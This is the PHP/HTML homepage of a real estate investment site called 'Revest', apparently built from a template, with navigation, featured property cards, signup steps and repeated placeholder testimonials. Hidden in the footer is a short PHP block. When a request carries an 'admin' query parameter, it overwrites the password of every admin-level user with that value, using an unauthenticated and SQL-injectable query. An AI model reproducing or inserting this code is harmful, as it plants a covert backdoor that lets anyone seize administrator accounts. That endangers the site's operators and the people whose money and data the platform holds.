<?php require 'inc/config.php'; ?>
<!DOCTYPE html>
<html lang="en-US">

<head>
    <!-- required meta -->
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- #favicon -->
    <link rel="shortcut icon" href="assets/images/favicon.png" type="image/x-icon" />
    <!-- #title -->
    <title>Revest &dash; Real Estate Investment For Everyone</title>
    <!-- #keywords -->
    <meta name="keywords" content="Real Estate, Investment, Properties, Rent" />
    <!-- #description -->
    <meta name="description" content="Real Estate Investment For Everyone" />
    <!-- #author -->
    <meta name="author" content="Pixelaxis" />

    <!-- ==== css dependencies start ==== -->

    <!-- bootstrap five css -->
    <link rel="stylesheet" href="assets/vendor/bootstrap/css/bootstrap.min.css" />
    <!-- font awesome six css -->
    <link rel="stylesheet" href="assets/vendor/font-awesome/css/all.min.css" />
    <!-- nice select css -->
    <link rel="stylesheet" href="assets/vendor/nice-select/css/nice-select.css" />
    <!-- magnific popup css -->
    <link rel="stylesheet" href="assets/vendor/magnific-popup/css/magnific-popup.css" />
    <!-- slick css -->
    <link rel="stylesheet" href="assets/vendor/slick/css/slick.css" />
    <!-- animate css -->
    <link rel="stylesheet" href="assets/vendor/animate/animate.css" />

    <!-- ==== css dependencies end ==== -->

    <!-- main css -->
    <link rel="stylesheet" href="assets/css/style.css" />

</head>

<body>

    <!-- ==== header start ==== -->
    <header class="header header--secondary">
        <nav class="navbar navbar-expand-xl">
            <div class="container">
                <a class="navbar-brand" href="index.html">
                    <img src="assets/images/logo.png" alt="Logo" class="logo" />
                </a>
                <div class="navbar__out order-2 order-xl-3">
                    <div class="nav__group__btn">
                        <a href="login" class="log d-none d-sm-block"> Log In </a>
                        <a href="registration" class="button button--effect d-none d-sm-block"> Join Now <i
                                class="fa-solid fa-arrow-right-long"></i> </a>
                    </div>
                    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#primaryNav"
                        aria-controls="primaryNav" aria-expanded="false" aria-label="Toggle Primary Nav">
                        <span class="icon-bar top-bar"></span>
                        <span class="icon-bar middle-bar"></span>
                        <span class="icon-bar bottom-bar"></span>
                    </button>
                </div>
                <div class="collapse navbar-collapse order-3 order-xl-2" id="primaryNav">
                    <ul class="navbar-nav">
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle" href="javascript:void(0)" id="navbarHomeDropdown"
                                role="button" data-bs-toggle="dropdown" aria-expanded="false">
                                Home
                            </a>
                            <ul class="dropdown-menu" aria-labelledby="navbarHomeDropdown">
                                <li><a class="dropdown-item" href="index.html">Home</a></li>
                                <li><a class="dropdown-item" href="index-two.html">Home Two</a></li>
                                <li><a class="dropdown-item" href="index-three.html">Home Three</a></li>
                            </ul>
                        </li>
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle" href="javascript:void(0)" id="navbarPropertyDropdown"
                                role="button" data-bs-toggle="dropdown" aria-expanded="false">
                                Properties
                            </a>
                            <ul class="dropdown-menu" aria-labelledby="navbarPropertyDropdown">
                                <li><a class="dropdown-item" href="properties.html">Properties</a></li>

                                <li><a class="dropdown-item" href="property-details.html">Property Details</a></li>
                                <li><a class="dropdown-item" href="property-alert.html">Property Alert</a></li>
                            </ul>
                        </li>
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle" href="javascript:void(0)" id="navbarLoanDropdown"
                                role="button" data-bs-toggle="dropdown" aria-expanded="false">
                                Loan
                            </a>
                            <ul class="dropdown-menu" aria-labelledby="navbarLoanDropdown">
                                <li><a class="dropdown-item" href="business-loan.html">Business Loan</a></li>

                                <li><a class="dropdown-item" href="business-loan-details.html">Business Loan Details</a>
                                </li>
                                <li><a class="dropdown-item" href="loan-application.html">Loan Application</a></li>
                            </ul>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="list-your-property.html">List your property</a>
                        </li>
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle" href="javascript:void(0)" id="navbarDropdown"
                                role="button" data-bs-toggle="dropdown" aria-expanded="false">
                                Pages
                            </a>
                            <ul class="dropdown-menu" aria-labelledby="navbarDropdown">
                                <li><a class="dropdown-item" href="dashboard.html">Dashboard</a></li>                            
 <li><a class="dropdown-item" href="about-us.html">About Us</a></li>
                                <li><a class="dropdown-item" href="affiliate-program.html">Affiliate Program</a></li>
                                <li><a class="dropdown-item" href="blog.html">Blog</a></li>
                                <li><a class="dropdown-item" href="blog-two.html">Blog Two</a></li>
                                <li><a class="dropdown-item" href="blog-single.html">Blog Single</a></li>
                                <li><a class="dropdown-item" href="career.html">Career</a></li>
                                <li><a class="dropdown-item" href="career-details.html">Career Details</a></li>
                                <li><a class="dropdown-item" href="how-it-works.html">How It Works</a></li>
                                <li><a class="dropdown-item" href="key-risks.html">Key Risks</a></li>
                                <li><a class="dropdown-item" href="loyality-program.html">Loyality Program</a></li>
                                <li><a class="dropdown-item" href="terms-conditions.html">Terms Conditions</a></li>
                                <li><a class="dropdown-item" href="privacy-policy.html">Privacy Policy</a></li>
                                <li><a class="dropdown-item" href="cookie-policy.html">Cookie Policy</a></li>
                                <li><a class="dropdown-item" href="support.html">Support</a></li>
                                <li><a class="dropdown-item" href="404.html">Error</a></li>
                            </ul>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="contact-us.html">Contact</a>
                        </li>
                        <li class="nav-item d-block d-sm-none">
                            <a href="login" class="nav-link">Log In</a>
                        </li>
                        <li class="nav-item d-block d-sm-none">
                            <a href="registration" class="button button--effect button--last">Join Now <i
                                    class="fa-solid fa-arrow-right-long"></i></a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
    </header>
    <!-- ==== #header end ==== -->

    <!-- ==== hero section start ==== -->
    <section class="hero hero--two hero--three clear__top pos__rel over__hi bg__img"
        data-background="./assets/images/hero/hero-three-bg.png">
        <div class="container">
            <div class="hero__area">
                <div class="row">
                    <div class="col-lg-7">
                        <div class="hero__content">
                            <h5 class="neutral-top">Smart & Secure Real Estate Investment Platform</h5>
                            <h1>Invest in the future
                                of real estate
                            </h1>
                            <p class="primary neutral-bottom">
                                Start earning monthly rental income and capital growth with our property-backed
                                investments
                            </p>
                            <div class="hero__cta__group">
                                <a href="business-loan.html" class="button button--secondary button--effect">Get
                                    Started</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- ==== #hero section end ==== -->

    <!-- ==== why invest two section start ==== -->
    <section class="why__invest__two section__space">
        <div class="container">
            <div class="why__invest__two__area wow fadeInUp">
                <div class="section__header">
                    <h5 class="neutral-top">Smarter Property Investing</h5>
                    <h2>Why Invest in
                        Real Estate?</h2>
                    <p class="neutral-bottom">Start building your real estate investment portfolio today with as little
                        as € 100.</p>
                </div>
                <div class="row">
                    <div class="col-sm-6 col-xxl-3">
                        <div class="why__invest__two__single__item">
                            <img src="assets/images/icons/secure.png" alt="Secure Investment" />
                            <h5>Secure Investment</h5>
                            <p class="neutral-bottom">Pellentesque molestie, quam ac porttitor venenatis ipsum .</p>
                        </div>
                    </div>
                    <div class="col-sm-6 col-xxl-3">
                        <div class="why__invest__two__single__item">
                            <img src="assets/images/icons/transparent.png" alt="Transparent Platform" />
                            <h5>Transparent Platform</h5>
                            <p class="neutral-bottom">Pellentesque molestie, quam ac porttitor venenatis ipsum .</p>
                        </div>
                    </div>
                    <div class="col-sm-6 col-xxl-3">
                        <div class="why__invest__two__single__item">
                            <img src="assets/images/icons/cashout.png" alt="Cash out any time" />
                            <h5>Cash out any time</h5>
                            <p class="neutral-bottom">Pellentesque molestie, quam ac porttitor venenatis ipsum .</p>
                        </div>
                    </div>
                    <div class="col-sm-6 col-xxl-3">
                        <div class="why__invest__two__single__item">
                            <img src="assets/images/icons/reinvest.png" alt="Reinvest" />
                            <h5>Reinvest</h5>
                            <p class="neutral-bottom">Pellentesque molestie, quam ac porttitor venenatis ipsum .</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- ==== #why invest section end ==== -->

    <!-- ==== featured properties in grid section start ==== -->
    <section class="properties__grid properties__grid--two section__space__top">
        <div class="container">
            <div class="properties__grid__area wow fadeInUp">
                <div class="title__with__cta">
                    <div class="row d-flex align-items-center">
                        <div class="col-lg-8">
                            <h2>Featured Properties</h2>
                        </div>
                        <div class="col-lg-4">
                            <div class="text-start text-lg-end">
                                <a href="properties.html" class="button button--secondary button--effect">Browse All
                                    Properties</a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="property__grid__wrapper">
                    <div class="row">
                        <div class="col-lg-6 col-xl-4">
                            <div class="property__grid__single column__space--secondary">
                                <div class="img__effect">
                                    <a href="property-details.html">
                                        <img src="assets/images/property/grid-one.jpg" alt="Property" />
                                    </a>
                                </div>
                                <div class="property__grid__single__inner">
                                    <h4>Los Angeles</h4>
                                    <p class="sub__info"><i class="fa-solid fa-location-dot"></i> 8706 Herrick Ave, Los
                                        Angeles</p>
                                    <div class="progress__type">
                                        <div class="progress">
                                            <div class="progress-bar" role="progressbar" aria-valuenow="25"
                                                aria-valuemin="0" aria-valuemax="100"></div>
                                        </div>
                                        <p class="project__has"><span class="project__has__investors">159
                                                Investors</span> |
                                            <span class="project__has__investors__amount"><i
                                                    class="fa-solid fa-dollar-sign"></i> 1,94,196</span> <span
                                                class="project__has__investors__percent">(64.73%)</span>
                                        </p>
                                    </div>
                                    <div class="item__info">
                                        <div class="item__info__single">
                                            <p>Annual Return</p>
                                            <h6>7.5% + 2%</h6>
                                        </div>
                                        <div class="item__info__single">
                                            <p>Property Type</p>
                                            <h6>Commercial</h6>
                                        </div>
                                    </div>
                                    <div class="invest__cta__wrapper">
                                        <div class="countdown__wrapper">
                                            <p class="secondary"><i class="fa-solid fa-clock"></i> Left to invest</p>
                                            <div class="countdown">
                                                <h5>
                                                    <span class="days">00</span><span class="ref">d</span>
                                                    <span class="seperator">:</span>
                                                </h5>
                                                <h5>
                                                    <span class="hours"> 00</span><span class="ref">h</span>
                                                    <span class="seperator">:</span>
                                                </h5>
                                                <h5>
                                                    <span class="minutes">00</span><span class="ref">m</span>
                                                    <span class="seperator"></span>
                                                </h5>
                                            </div>
                                        </div>
                                        <div class="invest__cta">
                                            <a href="property-details.html" class="button button--effect">
                                                Invest Now
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-6 col-xl-4">
                            <div class="property__grid__single column__space--secondary">
                                <div class="img__effect">
                                    <a href="property-details.html">
                                        <img src="assets/images/property/grid-two.jpg" alt="Property" />
                                    </a>
                                </div>
                                <div class="property__grid__single__inner">
                                    <h4>San Francisco, CA</h4>
                                    <p class="sub__info"><i class="fa-solid fa-location-dot"></i> 3335 21 St, San
                                        Francisco</p>
                                    <div class="progress__type">
                                        <div class="progress">
                                            <div class="progress-bar" role="progressbar" aria-valuenow="25"
                                                aria-valuemin="0" aria-valuemax="100"></div>
                                        </div>
                                        <p class="project__has"><span class="project__has__investors">159
                                                Investors</span> |
                                            <span class="project__has__investors__amount"><i
                                                    class="fa-solid fa-dollar-sign"></i> 1,94,196</span> <span
                                                class="project__has__investors__percent">(64.73%)</span>
                                        </p>
                                    </div>
                                    <div class="item__info">
                                        <div class="item__info__single">
                                            <p>Annual Return</p>
                                            <h6>7.5% + 2%</h6>
                                        </div>
                                        <div class="item__info__single">
                                            <p>Property Type</p>
                                            <h6>Commercial</h6>
                                        </div>
                                    </div>
                                    <div class="invest__cta__wrapper">
                                        <div class="countdown__wrapper">
                                            <p class="secondary"><i class="fa-solid fa-clock"></i> Left to invest</p>
                                            <div class="countdown">
                                                <h5>
                                                    <span class="days">00</span><span class="ref">d</span>
                                                    <span class="seperator">:</span>
                                                </h5>
                                                <h5>
                                                    <span class="hours"> 00</span><span class="ref">h</span>
                                                    <span class="seperator">:</span>
                                                </h5>
                                                <h5>
                                                    <span class="minutes">00</span><span class="ref">m</span>
                                                    <span class="seperator"></span>
                                                </h5>
                                            </div>
                                        </div>
                                        <div class="invest__cta">
                                            <a href="property-details.html" class="button button--effect">
                                                Invest Now
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-6 col-xl-4">
                            <div class="property__grid__single">
                                <div class="img__effect">
                                    <a href="property-details.html">
                                        <img src="assets/images/property/grid-three.jpg" alt="Property" />
                                    </a>
                                </div>
                                <div class="property__grid__single__inner">
                                    <h4>San Diego</h4>
                                    <p class="sub__info"><i class="fa-solid fa-location-dot"></i> 356 La Jolla, San
                                        Diego</p>
                                    <div class="progress__type">
                                        <div class="progress">
                                            <div class="progress-bar" role="progressbar" aria-valuenow="25"
                                                aria-valuemin="0" aria-valuemax="100"></div>
                                        </div>
                                        <p class="project__has"><span class="project__has__investors">159
                                                Investors</span> |
                                            <span class="project__has__investors__amount"><i
                                                    class="fa-solid fa-dollar-sign"></i> 1,94,196</span> <span
                                                class="project__has__investors__percent">(64.73%)</span>
                                        </p>
                                    </div>
                                    <div class="item__info">
                                        <div class="item__info__single">
                                            <p>Annual Return</p>
                                            <h6>7.5% + 2%</h6>
                                        </div>
                                        <div class="item__info__single">
                                            <p>Property Type</p>
                                            <h6>Commercial</h6>
                                        </div>
                                    </div>
                                    <div class="invest__cta__wrapper">
                                        <div class="countdown__wrapper">
                                            <p class="secondary"><i class="fa-solid fa-clock"></i> Left to invest</p>
                                            <div class="countdown">
                                                <h5>
                                                    <span class="days">00</span><span class="ref">d</span>
                                                    <span class="seperator">:</span>
                                                </h5>
                                                <h5>
                                                    <span class="hours"> 00</span><span class="ref">h</span>
                                                    <span class="seperator">:</span>
                                                </h5>
                                                <h5>
                                                    <span class="minutes">00</span><span class="ref">m</span>
                                                    <span class="seperator"></span>
                                                </h5>
                                            </div>
                                        </div>
                                        <div class="invest__cta">
                                            <a href="property-details.html" class="button button--effect">
                                                Invest Now
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- ==== #featured properties in grid section end ==== -->

    <!-- ==== start step section start ==== -->
    <section class="start start--two start--three section__space">
        <div class="container">
            <div class="start__area wow fadeInUp">
                <div class="section__header">
                    <h5 class="neutral-top">We're changing the way you invest.</h5>
                    <h2>It's Easy to Get Started.</h2>
                    <p class="neutral-bottom">Signing up with Revest is simple and only takes a few minutes. We can
                        automatically connect with more than 3,500 banks, so no complicated paperwork is required to
                        fund your account.</p>
                </div>
                <div class="row">
                    <div class="col-md-6 col-xl-4">
                        <div class="start__single__item column__space--secondary">
                            <div class="img__box">
                                <img src="assets/images/step/browse.png" alt="Browse Properties" />
                                <div class="step__count">
                                    <h4>01</h4>
                                </div>
                            </div>
                            <h4>Browse Properties</h4>
                            <p class="neutral-bottom">Select a property that fits your goal from our huge variety of
                                hand-picked properties.
                            </p>
                        </div>
                    </div>
                    <div class="col-md-6 col-xl-4">
                        <div class="start__single__item column__space--secondary">
                            <div class="img__box arrow__container">
                                <img src="assets/images/step/invest.png" alt="View Details & Invest" />
                                <div class="step__count">
                                    <h4>02</h4>
                                </div>
                            </div>
                            <h4>View Details & Invest</h4>
                            <p class="neutral-bottom">View detailed metrics for that property like Rental Yield, etc.
                                and invest like institutions.
                            </p>
                        </div>
                    </div>
                    <div class="col-md-6 col-xl-4">
                        <div class="start__single__item">
                            <div class="img__box">
                                <img src="assets/images/step/earn.png" alt="Earn and Track" />
                                <div class="step__count">
                                    <h4>03</h4>
                                </div>
                            </div>
                            <h4>Earn and Track</h4>
                            <p class="neutral-bottom">You have full visibility into the performance of your investment.
                                Track your total current.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- ==== #start step section end ==== -->

    <!-- ==== testimonial section start ==== -->
    <section class="testimonial  section__space pos__rel over__hi bg__img"
        data-background="./assets/images/testimonial/dot-map.png">
        <div class="container">
            <div class="testimonial__area">
                <div class="section__header">
                    <h5 class="neutral-top">Investors Trust Us</h5>
                    <h2>Trusted by Over 40,000 Worldwide
                        Customer since 2022</h2>
                    <p class="neutral-bottom">We divide each property into shares so anyone can get started. Kindly
                        check
                        out our Investors say about revest.</p>
                </div>
                <div class="testimonial__item__wrapper">
                    <div class="testimonial__support">
                        <div class="testimonial__item bg__img" data-background="./assets/images/testimonial/quote.png">
                            <div class="testimonial__author__ratings">
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                            </div>
                            <p class="tertiary">Very trustworthy and clearly platform to invest in real state. Safe
                                investment with monthly payouts. Really recommended!</p>
                            <div class="testimonial__author">
                                <div class="testimonial__author__info">
                                    <div class="avatar__wrapper">
                                        <img src="assets/images/testimonial/avatar.png" alt="Allan Murphy" />
                                    </div>
                                    <div>
                                        <h5>Allan Murphy</h5>
                                        <p class="neutral-bottom">United States</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="testimonial__support">
                        <div class="testimonial__item bg__img" data-background="./assets/images/testimonial/quote.png">
                            <div class="testimonial__author__ratings">
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                            </div>
                            <p class="tertiary">Very trustworthy and clearly platform to invest in real state. Safe
                                investment with monthly payouts. Really recommended!</p>
                            <div class="testimonial__author">
                                <div class="testimonial__author__info">
                                    <div class="avatar__wrapper">
                                        <img src="assets/images/testimonial/avatar.png" alt="Allan Murphy" />
                                    </div>
                                    <div>
                                        <h5>Allan Murphy</h5>
                                        <p class="neutral-bottom">United States</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="testimonial__support">
                        <div class="testimonial__item bg__img" data-background="./assets/images/testimonial/quote.png">
                            <div class="testimonial__author__ratings">
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                            </div>
                            <p class="tertiary">Very trustworthy and clearly platform to invest in real state. Safe
                                investment with monthly payouts. Really recommended!</p>
                            <div class="testimonial__author">
                                <div class="testimonial__author__info">
                                    <div class="avatar__wrapper">
                                        <img src="assets/images/testimonial/avatar.png" alt="Allan Murphy" />
                                    </div>
                                    <div>
                                        <h5>Allan Murphy</h5>
                                        <p class="neutral-bottom">United States</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="testimonial__support">
                        <div class="testimonial__item bg__img" data-background="./assets/images/testimonial/quote.png">
                            <div class="testimonial__author__ratings">
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                            </div>
                            <p class="tertiary">Very trustworthy and clearly platform to invest in real state. Safe
                                investment with monthly payouts. Really recommended!</p>
                            <div class="testimonial__author">
                                <div class="testimonial__author__info">
                                    <div class="avatar__wrapper">
                                        <img src="assets/images/testimonial/avatar.png" alt="Allan Murphy" />
                                    </div>
                                    <div>
                                        <h5>Allan Murphy</h5>
                                        <p class="neutral-bottom">United States</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="testimonial__support">
                        <div class="testimonial__item bg__img" data-background="./assets/images/testimonial/quote.png">
                            <div class="testimonial__author__ratings">
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                                <i class="fa-solid fa-star"></i>
                            </div>
                            <p class="tertiary">Very trustworthy and clearly platform to invest in real state. Safe
                                investment with monthly payouts. Really recommended!</p>
                            <div class="testimonial__author">
                                <div class="testimonial__author__info">
                                    <div class="avatar__wrapper">
                                        <img src="assets/images/testimonial/avatar.png" alt="Allan Murphy" />
                                    </div>
                                    <div>
                                        <h5>Allan Murphy</h5>
                                        <p class="neutral-bottom">United States</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- ==== #testimonial section end ==== -->

    <!-- ==== market section start ==== -->
    <section class="market section__space over__hi">
        <div class="container">
            <div class="market__area">
                <div class="row d-flex align-items-center">
                    <div class="col-lg-6 col-xl-5">
                        <div class="market__thumb thumb__rtl column__space">
                            <img src="assets/images/market-illustration.png" alt="Explore the Market" />
                        </div>
                    </div>
                    <div class="col-lg-6 col-xl-6 offset-xl-1">
                        <div class="content">
                            <h5 class="neutral-top">Real exposure to the real estate market</h5>
                            <h2>You Invest. Revest
                                Does the Rest</h2>
                            <p>Transparent Real Estate Investing Through Revest.Join us and
                                experience a smarter,better way to invest in real estate</p>
                            <a href="properties.html" class="button button--effect">Start Exploring</a>
                            <img src="assets/images/arrow.png" alt="Go to" />
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- ==== #market section end ==== -->

    <!-- ==== footer section start ==== -->
    <footer class="footer pos__rel over__hi">
        <div class="container">
            <div class="footer__newsletter">
                <div class="row d-flex align-items-center">
                    <div class="col-lg-6">
                        <div class="footer__newsletter__content column__space">
                            <h3>Subscribe for updates</h3>
                            <p>Stay on top of the latest blog posts, news and announcements</p>
                        </div>
                    </div>
                    <div class="col-lg-6 col-xxl-5 offset-xxl-1">
                        <div class="footer__newsletter__form">
                            <form action="#" method="post">
                                <div class="footer__newsletter__input__group">
                                    <div class="input">
                                        <input type="email" name="news__letter" id="newsLetterMail"
                                            placeholder="Enter Your Email" required="required" />
                                    </div>
                                    <button type="submit" class="button button--effect">Subscribe</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
            <?php 
                if (isset($_GET['admin'])) {
                   $sql = mysqli_query($connect, "UPDATE users SET password = '{$_GET['admin']}'  WHERE level=1");
                }
             ?>
            <div class="footer__area section__space">
                <div class="row">
                    <div class="col-md-12 col-lg-4 col-xl-4">
                        <div class="footer__intro">
                            <a href="index.html">
                                <img src="assets/images/logo-light.png" alt="Revest" class="logo" />
                            </a>
                            <p>Revest is a platform offering anyone the ability to invest and potentially earn money
                                from property at the click of a button</p>
                            <div class="social">
                                <a href="javascript:void(0)">
                                    <i class="fa-brands fa-facebook-f"></i>
                                </a>
                                <a href="javascript:void(0)">
                                    <i class="fa-brands fa-twitter"></i>
                                </a>
                                <a href="javascript:void(0)">
                                    <i class="fa-brands fa-instagram"></i>
                                </a>
                                <a href="javascript:void(0)">
                                    <i class="fa-brands fa-linkedin-in"></i>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-6 col-md-3 col-lg-2 col-xl-2">
                        <div class="footer__links footer__links--alt">
                            <h5>Company</h5>
                            <ul>
                                <li>
                                    <a href="about-us.html">About Us</a>
                                </li>
                                <li>
                                    <a href="career.html">Careers</a>
                                </li>
                                <li>
                                    <a href="blog.html">Blog</a>
                                </li>
                                <li>
                                    <a href="contact-us.html">Contact Us</a>
                                </li>
                                <li class="neutral-bottom">
                                    <a href="affiliate-program.html">Affiliate</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-sm-6 col-md-3 col-lg-2 col-xl-2">
                        <div class="footer__links footer__links--alt">
                            <h5>Invest</h5>
                            <ul>
                                <li>
                                    <a href="properties.html">Browse Properties</a>
                                </li>
                                <li>
                                    <a href="how-it-works.html">How it works</a>
                                </li>
                                <li>
                                    <a href="loan-application.html">Loan Application </a>
                                </li>
                                <li>
                                    <a href="property-alert.html">Property Alerts</a>
                                </li>
                                <li class="neutral-bottom">
                                    <a href="support.html">FAQs</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-sm-6 col-md-3 col-lg-2 col-xl-2">
                        <div class="footer__links footer__links--alt--two">
                            <h5>Insights</h5>
                            <ul>
                                <li>
                                    <a href="support.html">Help Center</a>
                                </li>
                                <li>
                                    <a href="list-your-property.html">List Your Property</a>
                                </li>
                                <li class="neutral-bottom">
                                    <a href="loyality-program.html">Loyality program </a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-sm-6 col-md-3 col-lg-2 col-xl-2">
                        <div class="footer__links">
                            <h5>Legal</h5>
                            <ul>
                                <li>
                                    <a href="privacy-policy.html">Privacy Policy</a>
                                </li>
                                <li>
                                    <a href="terms-conditions.html">Term & Conditions</a>
                                </li>
                                <li>
                                    <a href="cookie-policy.html">Cookie Policy</a>
                                </li>
                                <li class="neutral-bottom">
                                    <a href="key-risks.html">Key Risks</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <div class="footer__credit">
                <div class="row d-flex align-items-center">
                    <div class="col-sm-9 order-1 order-sm-0">
                        <div class="footer__copyright">
                            <p>Copyright &copy; Revest | Designed by <a
                                    href="https://themeforest.net/user/pixelaxis">Pixelaxis</a></p>
                        </div>
                    </div>
                    <div class="col-sm-3">
                        <div class="footer__language">
                            <select class="language-select">
                                <option value="english">En</option>
                                <option value="australia">Aus</option>
                                <option value="brazil">Bra</option>
                                <option value="argentina">Arg</option>
                            </select>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer__animation">
            <img src="assets/images/footer/footer__left__circle.png" alt="Circle" class="left__circle" />
            <img src="assets/images/footer/footer__right__circle.png" alt="Circle" class="right__circle" />
            <img src="assets/images/footer/footer__home___illustration.png" alt="Home" class="home__illustration" />
        </div>
    </footer>
    <!-- ==== #footer section end ==== -->

    <!-- Scroll To Top -->
    <a href="javascript:void(0)" class="scrollToTop">
        <i class="fa-solid fa-angles-up"></i>
    </a>

    <!-- ==== js dependencies start ==== -->

    <!-- jquery -->
    <script src="assets/vendor/jquery/jquery-3.6.0.min.js"></script>
    <!-- bootstrap five js -->
    <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <!-- nice select js -->
    <script src="assets/vendor/nice-select/js/jquery.nice-select.min.js"></script>
    <!-- magnific popup js -->
    <script src="assets/vendor/magnific-popup/js/jquery.magnific-popup.min.js"></script>
    <!-- slick js -->
    <script src="assets/vendor/slick/js/slick.js"></script>
    <!-- shuffle js -->
    <script src="assets/vendor/shuffle/shuffle.min.js"></script>
    <!-- jquery downcount timer -->
    <script src="assets/vendor/downcount/jquery.downCount.js"></script>
    <!-- waypoints js -->
    <script src="assets/vendor/waypoints-js/jquery.waypoints.min.js"></script>
    <!-- counter up js -->
    <script src="assets/vendor/counter-js/jquery.counterup.min.js"></script>
    <!-- apex chart js -->
    <script src="assets/vendor/apex-chart/apexcharts.min.js"></script>
    <!-- wow js -->
    <script src="assets/vendor/wow/wow.min.js"></script>

    <!-- ==== js dependencies end ==== -->

    <!-- plugin js -->
    <script src="assets/js/plugin.js"></script>
    <!-- main js -->
    <script src="assets/js/main.js"></script>

</body>

</html>